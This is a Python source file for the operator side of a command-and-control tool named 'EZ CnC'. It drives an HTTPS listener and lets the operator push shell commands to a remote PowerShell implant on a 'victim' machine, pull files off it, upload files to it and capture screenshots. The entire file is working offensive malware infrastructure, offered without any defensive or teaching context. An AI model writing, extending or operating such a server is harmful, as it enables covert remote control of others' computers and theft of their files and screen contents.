#!/usr/bin/python 

#########
## Version 0.3.1 of the EZ CnC
##
## COMPLETE: HTTPS
## COMPLETE: Screenshots 
## COMPLETE: COmmands via GET
## COMPLETE: Uploads to victim
## COMPLETE: Downloads from victim
## COMPLETE: Sleep Variable
## COMPLETE: Generate victim.ps1 on fly (config.sh .. to config.py)
## COMPLETE: Add custom Port when starting commandServer.py
## COMPLETE: Server IP 
## COMPLETE: Add Logging capabilities of output
## TODO: Add Better Logging capabilities (only does GET commands currently)
## COMPLETE: Global Variables
## COMPLETE: How to run script
## COMPLETE: Require -p 8080 port
## COMPLETE: Argument precheck
## COMPLETE: Argument While Loop
## COMPLETE: Start eguiHTTPS.py and server.py
## COMPLETE: Cat the Banner.txt
## COMPLETE: Print Help functionality
## COMPLETE: Keyboard while loop (wait for key press)
## COMPLETE: Main While Loop
## COMPLETE: Cleanup Script
## TODO: Have a 'snapshot'.. where it enumerates the host and sends it back 
## TODO: Performs searches ?



######
# IMPORT
######
import sys
import argparse
import time
import os
import subprocess
import psutil
import base64

######
## GLOBAL VARIABLES
######
SLEEP=(5)
pwd = os.getcwd()
cc=(pwd + '/ServerRequirements/cc.js')
eguiHTTPS=(pwd + '/ServerRequirements/eguiHTTPS.py')
server=(pwd + '/ServerRequirements/server.py')

def bannerFunc():
    # BANNER COMPLETE
    f = open('BANNER.txt', 'r').read()
    print(f)

def cleanupFunc():
    print("[!] Cleaning up..")
    processes = {'eguiHTTPS.py', 'server.py'}
    for proc in psutil.process_iter():
        # check whether the process name matches
        if proc.name() in processes:
            proc.kill()
    time.sleep(2)
    print("[!] Server successfully shutdown, Goodbye!")

def keyboardFunc():
    raw_input("[!] Press Enter to continue...")

def howToFunc():
    # MAYBE
    print("")
    print("[*] Type '1' to run a command")
    print("[*] Type '2' to download a file from victim")
    print("[*] Type '3' to upload a file to victim")
    print("[*] Type '4' to take a screenshot")

def mainLoopFunc():
    # Main Loop

    #print('MAIN LOOP')
    while True:
        howToFunc()
        user_input = str(raw_input("[+] Type '1', '2', '3', '4', or 'q/Q'\n"))
        print(user_input)

        if user_input is '1':
            #print("COMMAND!")
            command_input = raw_input("[+] What command do you want to run?\n")
            #print("Command is " + command_input)

            # Write command to cc
            f = open (cc, 'w')
            f.write(user_input + '\n')
            f.write(command_input + '\n')
            f.close()
            
            # Sleep a moment to refresh stuff
            time.sleep(SLEEP)
            continue

        elif user_input is '2':
            print("DOWNLOAD FROM VICTIM")
            command_input = raw_input("[+] What file do you want to Download from Victim?\n")
            # Write command to cc
            f = open (cc, 'w')
            f.write(user_input + '\n')
            f.write(command_input + '\n')
            f.close()

            print("[*] Waiting for results..")
            time.sleep(SLEEP)
            time.sleep(SLEEP)
            
            # Change name from FILENAME (created in eguiHTTPS.py) to real Filename
            os.rename('FILENAME', './Files/' + command_input)
            time.sleep(2)
            print("[!] " + command_input + " has been downloaded and saved to " + pwd + '/Files/' + command_input)
 
            continue
        elif user_input is '3':
            #print("UPLOAD TO VICTIM")
            command_input = raw_input("[+] What file do you want to Upload to Victim?\n")
            # Write command to cc
            f = open (cc, 'w')
            f.write(user_input + '\n')
            f.write(command_input + '\n')
            f.close()

            print("[*] Uploading file to Victim...")
            time.sleep(SLEEP)
            print("[*] Let's make sure it's there..")

            f = open (cc, 'w')
            f.write("1\n")
            f.write("dir " + command_input)
            f.close()

            # Sleep to make sure
            time.sleep(SLEEP)
            time.sleep(SLEEP)

            continue
        elif user_input is '4':
            #print("SCREENCAPTURE")
            # Blank out cc.js
            f = open (cc, 'w')
            f.write("")
            f.close()
            time.sleep(SLEEP)
            time.sleep(SLEEP)
            # Write command to cc
            f = open (cc, 'w')
            f.write(user_input + '\n')
            f.write(user_input + '\n')
            f.close()

            print("[*] Performing Screen Capture...")
            time.sleep(3)
            print("[!] Screen Capture Complete!")
            time.sleep(1)
            print("[*] Grabbing Screen Capture...")
            time.sleep(3)

            # Make Date File for Screenshot name
            dateFile = ("screenshot-" + time.strftime("%Y%m%d-%H%M%S") + ".bmp")
            
            time.sleep(SLEEP)
            # Read downloaded Screenshot1.bmp (which is base64 encoded) and decode it into a file with dateFile .. save it to Screenshots directory
            f = open('screenshot1.bmp', 'r').read()
            decoded = base64.b64decode(f)
            g = open('./Screenshots/' + dateFile, 'w')
            g.write(decoded)
            g.close()
            
            # Remove screenshot uploaded.. since it is renamed in ./Screenshots/ directory
            os.remove('screenshot1.bmp')
            time.sleep(SLEEP)

            continue
        elif user_input is 'q':
            #print("QUIT")
            break
        elif user_input is 'Q':
            #print("QUIT")
            break
        else:
            print("[-] Invalid command.. let's start over")
            continue

def main():
    # ARG PARSER BELOW
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', type=int, default='8000', metavar='<Port Number>',
        required=True,
        help="Provide a port the server will listen on")
    args = parser.parse_args()
    port = sys.argv[2]
    #print('Your port is ' + port) # Not needed

    # Run eguiHTTPS: Use the port established from arguments, save web logs to ./ServerRequirements/log.txt
    # Run server.py: Checks log.txt and does base64 decode of the results
    subprocess.Popen(['./ServerRequirements/eguiHTTPS.py', port], shell=False) 
    subprocess.Popen(['./ServerRequirements/server.py'], shell=False)

    # Clear cc.js
    f = open(cc, 'w')
    f.write('')
    f.close()

if __name__ == "__main__":
    main()
    
    # Sleep as things get in place
    time.sleep(5)

    # Print the Banner
    bannerFunc()

    time.sleep(2)

    # Run the Keyboard Function
    keyboardFunc()

    time.sleep(2)
    
    # Main Loop Function
    mainLoopFunc()
    
    # Run the cleanup Function
    cleanupFunc()
